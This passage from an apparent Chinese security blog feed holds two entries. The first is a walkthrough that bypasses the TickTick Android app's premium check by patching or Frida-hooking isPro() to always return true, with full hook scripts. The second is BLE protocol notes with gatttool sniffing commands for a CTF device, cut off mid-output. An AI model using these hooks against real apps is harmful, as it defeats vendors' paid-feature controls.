    <content type="html"><![CDATA[<p>android apk ： 滴答清单7.0.2.1 ( dida_dida_7021_release.apk )<br>frida version : frida 16.1.0</p><p>最近在使用滴答清单做记录，记录每天做的一些事情，但是看到基本的周表格都要会员，正好拿来练练手。</p><p>升级需要开通会员<br><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240102172841298.png"></p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>先搜索会员，可以看到“already_pro_account” 的字符串。<br><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20231214160338897.png"></p><p>搜索“already_pro_account” 的字符串，可以看到有一个 user.isPro() 函数。</p><p><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20231214154149095.png"></p><p>进入到这个函数中，可以看到 </p><blockquote><p>this.title.setText(getString(user.isPro() ? R.string.alreay_pro_account : R.string.upgrade_to_premium));</p></blockquote><p>这段代码的意思是，如果获取到 user.isPro()函数为true,那么就显示alreay_pro_account （你已经是高级会员了）。<br>如果不是，那就显示为（升级到高级会员）</p><p><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20231214154035155.png"></p><p><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20231214154229385.png"></p><p>查看 isPro() 的代码</p><p><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20231214154001493.png"></p><h2 id="绕过会员"><a href="#绕过会员" class="headerlink" title="绕过会员"></a>绕过会员</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在 1431 行 直接 return v1 。 绕过判断。<br><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20231214162625895.jpeg"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>直接使用 Frida 的来hook 这个函数isPro()。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title class_">User</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ticktick.task.data.User&quot;</span>);<br><span class="hljs-title class_">User</span>[<span class="hljs-string">&quot;isPro&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<span class="hljs-literal">true</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isPro is called&#x27;</span>);<br>    <span class="hljs-keyword">let</span> ret = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isPro</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isPro ret value is &#x27;</span> + ret);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>查看进程，这里要注意，可以看到这边进程中看到包名是 “cn.ticktick.task”， 但hook 的时候，会找系统中应用的base.apk内的实际函数路径，因此是“com.ticktick.task.data;”<br><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240102172313405.png"></p><p>hook 思路： 让isPro 函数永远返回true</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Author       : tigerHu</span><br><span class="hljs-string">Version      : V1.0</span><br><span class="hljs-string">Date         : 2023-12-21 20:36:52</span><br><span class="hljs-string">Description  :</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adb_forward</span>():<br>    os.system(<span class="hljs-string">&#x27;adb forward tcp:27042 tcp:27042&#x27;</span>)<br>    os.system(<span class="hljs-string">&#x27;adb forward tcp:27043 tcp:27043&#x27;</span>)<br><br>jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Java.perform(function()&#123;</span><br><span class="hljs-string">        let User = Java.use(&quot;com.ticktick.task.data.User&quot;);</span><br><span class="hljs-string">        User[&quot;isPro&quot;].implementation = function () &#123;</span><br><span class="hljs-string">            console.log(&#x27;isPro is called&#x27;);</span><br><span class="hljs-string">            let ret = this[&quot;isPro&quot;]();</span><br><span class="hljs-string">            console.log(&#x27;isPro ret value is &#x27; + ret);</span><br><span class="hljs-string">            return true;</span><br><span class="hljs-string">        &#125;;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]  &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br>        <br>adb_forward()<br><span class="hljs-comment"># 查找远程设备并附加到目标进程</span><br><span class="hljs-comment"># frida.get_remote_device() 远程设备,模拟器</span><br><span class="hljs-comment"># frida.get_usb_device  获取usb 设备</span><br>process = frida.get_usb_device().attach(<span class="hljs-number">9288</span>)<br><span class="hljs-comment">#pid = device.spawn([&quot;com.android.chrome&quot;])</span><br><span class="hljs-comment">#session = device.attach(pid)</span><br><span class="hljs-comment">#device.resume(pid)</span><br><br><span class="hljs-comment"># 在目标进程里创建脚本</span><br>script = process.create_script(jscode)<br><span class="hljs-comment"># 注册消息回调</span><br>script.on(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Hook Start Running&#x27;</span>)<br><span class="hljs-comment"># 加载创建好的javascript 脚本</span><br>script.load()<br><span class="hljs-comment"># 读取系统输入</span><br>sys.stdin.read()<br></code></pre></td></tr></table></figure><p><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240102172157870.png"></p><p><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240102172706011.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>蓝牙sniff&amp;CTF&amp;develop</title>
    <link href="/2023/12/18/45__%E8%93%9D%E7%89%99%20sniff%20&amp;%20CTF/"/>
    <url>/2023/12/18/45__%E8%93%9D%E7%89%99%20sniff%20&amp;%20CTF/</url>
    
    <content type="html"><![CDATA[<h2 id="蓝牙基础"><a href="#蓝牙基础" class="headerlink" title="蓝牙基础"></a>蓝牙基础</h2><h3 id="蓝牙标准"><a href="#蓝牙标准" class="headerlink" title="蓝牙标准"></a>蓝牙标准</h3><p>PDU : 协议数据单元，在一个传输单元中的有效传输数据。</p><h3 id="低功耗蓝牙消息交互流程"><a href="#低功耗蓝牙消息交互流程" class="headerlink" title="低功耗蓝牙消息交互流程"></a>低功耗蓝牙消息交互流程</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230702220906359.png"></p><h3 id="协议栈"><a href="#协议栈" class="headerlink" title="协议栈"></a>协议栈</h3><p>根据蓝牙协议栈架构图可以看出，蓝牙模块共有三大部分组成：</p><ul><li><p>Controller : 控制器，HCI以下</p><ul><li>controller 中的 PHY 层是用来指定BLE所用的无线频段、调制解调方式。由于BLE属于无线通信频率范围是2.400<del>2.4835GHz；为了同时支持多个设备，将整个频带分为40份，每份的带宽为2MHz，称为RF Channel,BLE的物理通道   频点为f&#x3D;2402+K*2 MHz  k&#x3D;0</del>39，带宽为2MHz的40个RF Channel，其中37，38，39 为广播信道。</li><li>Link Layer 链路层在40 个射频信道上收发数据，会在37个RF Channel 中选取一个，建立双方独立通信的通道，为了增加抗干扰性，会采用跳频技术(Hopping)。即在多个Channel 之间随机但有规律的切换。</li></ul></li><li><p>HOST：主机，L2CAP以及L2CAP以上。</p></li><li><p>HCI(Host Controller interface) : 主机控制接口，传输主机host 和controller 之间的接口，记录了从host 到controller 的commands 命令以及controller 到host 的响应events</p></li></ul><p>人们常说的蓝牙属于传统(经典)蓝牙还是BLE蓝牙，说的是蓝牙的规格，蓝牙的规格是由Controller 所决定的。</p><ul><li>BR&#x2F;EDR Controller ： 单模蓝牙模块，也就是常说的经典蓝牙。</li><li>LE Controller ：单模， BLE 蓝牙模块</li><li>BR&#x2F;EDR 和 LE Controller 组成的 Controller： 双模蓝牙模块，即支持传统蓝牙也支持BLE低功耗蓝牙。</li></ul><h4 id="BLE-HOST"><a href="#BLE-HOST" class="headerlink" title="BLE HOST"></a><strong>BLE HOST</strong></h4><p>L2CAP 层： 负责管理PDU数据的顺序、调度、分片、重组等功能，对蓝牙数据提供封装服务；<br>HCI层： 向上为主机提供软件应用程序接口（API），对外为外部硬件控制接口，可以通过串口、SPI、USB来实现设备控制。<br>SMP层：负责配对和密钥分发，实现安全连接和数据交换。<br>GAP层： 负责设备访问模式和进程，包含设备发现、建立连接、终止连接。初始化安全特性和设备配置，提供。<br>GATT层： 蓝牙设备之间的数据通信。</p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230701115920366.png"></p><h4 id="HCI-协议"><a href="#HCI-协议" class="headerlink" title="HCI 协议"></a>HCI 协议</h4><p>HCI 协议是HCI 接口最底层的协议，可根据传输层的介质分为不同类型<br>•UART传输层：在btsnoop中表示为hci_h4<br>•USB传输层：在btsnoop中表示为hci_h5<br>•SD传输层：Secure Digital</p><p>HCI 数据包分为command 、event 和 data 三种类型。command 表示host 发送给Controller 的命令，event 为Controller 发送给Host 的事件，data 通常是实际的蓝牙传输数据。</p><h4 id="L2CAP-协议"><a href="#L2CAP-协议" class="headerlink" title="L2CAP 协议"></a>L2CAP 协议</h4><p>蓝牙的通信协议格式为<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230713221729110.png"></p><p>Access Address 接入地址：用于是被是数据包还是广播包。<br><strong>ps:</strong> Octet和字节是相同的概念，都表示计算机中存储和传输数据的基本单位。在计算机科学中，一个字节由8个二进制位组成。因此，8位字节等于1字节。</p><p>PDU，ＢLE在Link Layer的PDU长度最大为<strong>257 octets</strong>。<br>Link Layer 总长度在9~264bytes(1+8 ~257+8)?????</p><h4 id="GATT"><a href="#GATT" class="headerlink" title="GATT"></a>GATT</h4><h5 id="ATT-属性协议"><a href="#ATT-属性协议" class="headerlink" title="ATT 属性协议"></a>ATT 属性协议</h5><p>BLE 里面的数据以属性 ( Attribute ) 方式存在，每条属性由四素质组成：</p><ul><li>属性句柄(Attribute handle) : 正如我们可以使用内存地址查找内存中的内容一样，ATT属性的句柄也可以协助我们找到相应的属性，例如第一个属性的句柄是0x001,第二个属性的句柄是0x002, 以此类推，最大可以到0xFFFF。</li><li>属性类型（Attribute UUID）： 每个数据有自己需要代表的意思，例如表示温度、发射功率、电池等等各种各样的信息。蓝牙组织（Bluetooth SIG）对常用的一些数据类型进行了归类，赋予不同的数据类型不同的识别码（UUID），例如0x2A09 表示电池信息，0x2A6E 表示温度信息。UUID 可以是16比特的（16-bit UUID）,也可以是128比特的（128-bit UUID）。</li><li>属性值（Attribute Value）: 属性值是每个属性真正要承载的信息，其他3个元素都是为了让对方能够更好的获取属性值。有些属性的长度是固定，例如电池属性（Battery Level）的长度只有1个字节，为需要表示的数据仅有0<del>100%，而 1 字节足以表示 1</del>100 的范围；而有些属性的长度的是可变的，例如基于BLE实现的透传模块。</li><li>属性许可（Attribute Permissions): 每个属性对各自的属性值有相应的访问限制，比如有些属性是可读、有些是可写的、有些是可读又可写的等等。</li></ul><h3 id="Service-Characteristic-Descriptor"><a href="#Service-Characteristic-Descriptor" class="headerlink" title="Service Characteristic Descriptor"></a>Service Characteristic Descriptor</h3><p>BLE 分为三部分Service(服务项)、Characteristic（特征值）、Descriptor（描述符），这三部分都由UUID做为唯一标示符。</p><ul><li><p>一个蓝牙4.0的终端可以包含多个Service</p></li><li><p>一个Service 可以包含多个Characteristic </p></li><li><p>一个Characteristic 包含一个Value 值 和多个Descriptor </p></li><li><p>一个Descriptor 包含一个Value</p><p>   BLE 规范中定义了GAP 和 GATT 两个配置文件。<br>   GAP 层负责设备访问模式和进程，包含设备发现、建立连接、终止连接。初始化安全特性和设备配置。<br>   GATT 层用于已连接的蓝牙设备之间的数据通信。</p></li></ul><p>GATT 是用于与BLE设备通信的协议。该设备是一个服务端，连接到设备的计算机或者移动设备是客户端，设备公开包含特征的服务，这些特征值具有值和一些可能的描述符，具体的结构如下所示：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">BLE server<br>    |<span class="hljs-string">-- Service</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Characteristic</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Value</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Descriptor</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Descriptor</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">     ...</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Characteristic</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Value</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Descriptor</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Descriptor</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">     ...</span><br><span class="hljs-string">    </span>|<span class="hljs-string">     ...</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- Service</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Characteristic</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Value</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Descriptor</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Descriptor</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">     ...</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Characteristic</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Value</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Descriptor</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">-- Descriptor</span><br><span class="hljs-string">    </span>|<span class="hljs-string">      </span>|<span class="hljs-string">     ...</span><br><span class="hljs-string">    </span>|<span class="hljs-string">     ...</span><br><span class="hljs-string">   ...</span><br></code></pre></td></tr></table></figure><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230720175832564.png"></p><h3 id="数据交换"><a href="#数据交换" class="headerlink" title="数据交换"></a>数据交换</h3><p>把存有数据（属性）的设备叫做服务器（Server), 而将获取别人设备数据的设备叫做客户端（Client）。下面是服务器和客户端间的常用操作：</p><ul><li><strong>客户端给服务端发数据</strong>，通过对服务器的数据进行写操作（Write）,来完成数据发送工作。写操作分两种，一种是写入请求（Write Request）, 一种是写入命令（Write Command）， 两者的主要区别在于前者需要对方回复响应（Write Response）,而后者不需要对方回复响应。</li><li><strong>服务端给客户端发数据</strong>，主要通过服务端指示（Indication）或者通知（Notification）的形式，实现将服务端更新的数据发给客户端。与写操作类似，指示和通知的主要区别是前者需要对方设备在收到数据指示后，进行回复（Confirmation）。</li><li>客户端也可以主动通过读操作读取服务端的数据。</li></ul><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230727234105794.png"></p><pre><code class="hljs">服务器和客户端之间的交互操作都是通过上述的消息ATT PDU 实现的。每个设备可以指定自己设备支持的最大ATT消息长度，我们称为MTU。</code></pre><h3 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h3><p>在BLE GATT 中，每个service、每个characteristic 和每个descriptor 都要一个特定的128比特的UUID表示，就是类似下面一串数字：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x0000xxxx</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">1000</span>-<span class="hljs-number">8000</span>-<span class="hljs-number">00805</span>F9B34FB<br></code></pre></td></tr></table></figure><p>为了简化，蓝牙技术联盟定义了16位UUID代替上面基本uuid 的’x’ 的部分。例如，心率测量特性使用0x2a37 作为它的16位uuid，因此它完整的128位uuid为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x00002A37</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">1000</span>-<span class="hljs-number">8000</span>-<span class="hljs-number">00805</span>F9B34FB<br></code></pre></td></tr></table></figure><p>另外，蓝牙技术联盟所用的基本uuid不能用于任何自定义的属性、服务和特性。对于自定义uuid，必须使用另外完整的128位uuid。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>蓝牙安全与攻击案例分析（好文）<br><a href="https://mp.weixin.qq.com/s/Ojm3LSw8q8H5pAT-JxUyqA">https://mp.weixin.qq.com/s/Ojm3LSw8q8H5pAT-JxUyqA</a><br>网络靶场实战——低功耗蓝牙初探（已保存到金山文档中）<br><a href="https://blog.csdn.net/We8__/article/details/128416397?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-128416397-blog-105454527.235%5Ev38%5Epc_relevant_sort_base1&spm=1001.2101.3001.4242.2&utm_relevant_index=4">https://blog.csdn.net/We8__/article/details/128416397?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-128416397-blog-105454527.235^v38^pc_relevant_sort_base1&amp;spm=1001.2101.3001.4242.2&amp;utm_relevant_index=4</a><br>低功耗蓝牙攻击实用指南<br><a href="https://delikely.github.io/2018/12/27/%E4%BD%8E%E5%8A%9F%E8%80%97%E8%93%9D%E7%89%99%E6%94%BB%E5%87%BB%E5%AE%9E%E7%94%A8%E6%8C%87%E5%8D%97/">https://delikely.github.io/2018/12/27/%E4%BD%8E%E5%8A%9F%E8%80%97%E8%93%9D%E7%89%99%E6%94%BB%E5%87%BB%E5%AE%9E%E7%94%A8%E6%8C%87%E5%8D%97/</a><br>利用物联网支持的 BLE 智能灯泡安全<br><a href="https://blog.attify.com/exploiting-iot-enabled-ble-smart-bulb-security/">https://blog.attify.com/exploiting-iot-enabled-ble-smart-bulb-security/</a><br>关于蓝牙的漏洞研究<br><a href="https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/">https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/</a><br>esp32 蓝牙 文档（很好的学习资料）<br>《esp32_bluetooth_architecture_cn.pdf》<br>《Assigned Numbers》<br><a href="https://btprodspecificationrefs.blob.core.windows.net/assigned-numbers/Assigned%20Number%20Types/Assigned_Numbers.pdf">https://btprodspecificationrefs.blob.core.windows.net/assigned-numbers/Assigned%20Number%20Types/Assigned_Numbers.pdf</a></p><h1 id="工具与命令使用"><a href="#工具与命令使用" class="headerlink" title="工具与命令使用"></a>工具与命令使用</h1><h2 id="gatttool"><a href="#gatttool" class="headerlink" title="gatttool"></a>gatttool</h2><p>更多命令 <a href="https://helpmanual.io/man1/gatttool/">https://helpmanual.io/man1/gatttool/</a></p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723231954245.png"></p><h2 id="hcitool"><a href="#hcitool" class="headerlink" title="hcitool"></a>hcitool</h2><p>更多命令 <a href="https://helpmanual.io/man1/hcitool/">https://helpmanual.io/man1/hcitool/</a></p><p>查看蓝牙：hciconfig</p><p>开启蓝牙：hciconfig hci0 up</p><p>蓝牙扫描：hcitool scan&#x2F;hcitool lescan</p><p>蓝牙状态：hcitool dev</p><p>蓝牙可被扫描：hciconfig -a hci0 piscan</p><p>修改蓝牙名称：hciconfig -a hci0 name ‘woshilanya’</p><p>&#x3D;&#x3D;hciattach、hcidump 等 hci* 工具套件</p><h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p>在Linux中，<code>xxd</code>是一个十六进制和ASCII编码之间转换的命令行工具。它可以用于查看二进制文件的十六进制表示，也可以将十六进制数据还原为原始的二进制数据。</p><p><code>xxd</code>命令的基本语法是：</p><p>复制代码</p><p><code>xxd [选项] [输入文件] [输出文件]</code></p><p>以下是一些常用的选项：</p><ul><li><code>-l &lt;长度&gt;</code>: 指定要显示的字节数。</li><li><code>-c &lt;列数&gt;</code>: 指定每行显示的字节数。</li><li><code>-g &lt;字节数&gt;</code>: 指定每个十六进制数的字节数，可以是1、2、4或8，默认是2。</li><li><code>-u</code>: 使用大写字母显示十六进制数。</li><li><code>-ps &lt;sep&gt;</code>: 用指定的分隔符代替默认的空格分隔符。</li><li><code>-r</code>: 反向操作，将十六进制转换回二进制数据。</li></ul><p>例如，要将一个文件”example.txt”以十六进制格式显示，可以运行以下命令：</p><p>复制代码</p><p><code>xxd example.txt</code></p><p>如果你只想显示前面16个字节的内容，可以使用 <code>-l</code> 选项指定长度：</p><p>复制代码</p><p><code>xxd -l 16 example.txt</code></p><p>如果你希望将一个十六进制文件转换回二进制文件，可以使用 <code>-r</code> 选项：</p><p>复制代码</p><p><code>xxd -r hex_file.txt bin_file</code></p><p>请注意，这只是<code>xxd</code>命令的一些基本用法，更多的选项和用法可以通过查看<code>xxd</code>的帮助文档来了解。要查看完整的<code>xxd</code>命令帮助文档，可以在终端中运行：</p><p>复制代码</p><p><code>man xxd</code></p><p>这将显示<code>xxd</code>命令的详细信息，包括所有可用选项和用法示例。</p><h2 id="nRF-Connect-lightblue"><a href="#nRF-Connect-lightblue" class="headerlink" title="nRF Connect &amp; lightblue"></a>nRF Connect &amp; lightblue</h2><h2 id="bleah"><a href="#bleah" class="headerlink" title="bleah"></a>bleah</h2><h1 id="蓝牙-sniff-CTF"><a href="#蓝牙-sniff-CTF" class="headerlink" title="蓝牙 sniff &amp; CTF"></a>蓝牙 sniff &amp; CTF</h1><h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><p>普通的BLE嗅探器通常只能捕获其中一个RF通道发送的数据包，无论是广播通道还是数据通道。<br>当捕获广播数据包的时候，会利用跳频机制在（37,38,39）之间不断切换，因此在捕获的时候，可能会丢包。<br>为了捕获连接，嗅探器只能在给定时间嗅探一个连接，切换到两个通信BLE设备交换数据包的RF通道来嗅探。</p><h2 id="手机蓝牙抓包"><a href="#手机蓝牙抓包" class="headerlink" title="手机蓝牙抓包"></a>手机蓝牙抓包</h2><p>工具：</p><ul><li>BLEt调试助手（<a href="http://www.wch.cn/downloads/BLEAssist_ZIP.html">http://www.wch.cn/downloads/BLEAssist_ZIP.html</a>） &#x2F;</li><li>nRF Connect  （<a href="https://github.com/NordicSemiconductor/Android-nRF-Connect">https://github.com/NordicSemiconductor/Android-nRF-Connect</a>）</li></ul><h2 id="NRF52832-BLE-抓包"><a href="#NRF52832-BLE-抓包" class="headerlink" title="NRF52832 BLE 抓包"></a>NRF52832 BLE 抓包</h2><p>安装wireshark ，安装python。导入插件，导入profile。</p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220914173115924.png" alt="image-20220914173115924"></p><p>点击捕获，刷新，然后就可以看到接口。</p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220914173246414.png" alt="image-20220914173246414"></p><p>参考《青风教你学蓝牙:抓包器教程》</p><h2 id="CSR4-0-kali-抓包"><a href="#CSR4-0-kali-抓包" class="headerlink" title="CSR4.0 kali 抓包"></a>CSR4.0 kali 抓包</h2><p>抓包设备: SCR8510</p><p>hicconfig 查看</p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220914151410101.png" alt="image-20220914151410101"></p><p>激活蓝牙设备 ： hciconfig hci1 up</p><p>查看蓝牙信息：hciconfig hci1 lestates</p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220914151717385.png" alt="image-20220914151717385"></p><p>扫描低功耗蓝牙的MAC地址，<br>问题1： 如果执行扫描显示超时，重新插拔一次 CSR8510。</p><blockquote><p>C8:F0:9E:A6:C8:D2 BLECTF</p></blockquote><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220920224829813.png" alt="image-20220920224829813"></p><p>使用命令<code>gatttool -b $MAC --primary</code>  获取蓝牙服务端提供的Service (服务)</p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220920225103860.png" alt="image-20220920225103860"></p><p>使用<code>gatttool -b $MAC --characteristics</code>  设备上所有的 characteristics (特征值)</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[C8:F0:9E:A6:C8:D2][LE]&gt; characteristics <br>handle: 0x0002, char properties: 0x20, char value handle: 0x0003, uuid: 00002a05<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0015, char properties: 0x02, char value handle: 0x0016, uuid: 00002a00<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span 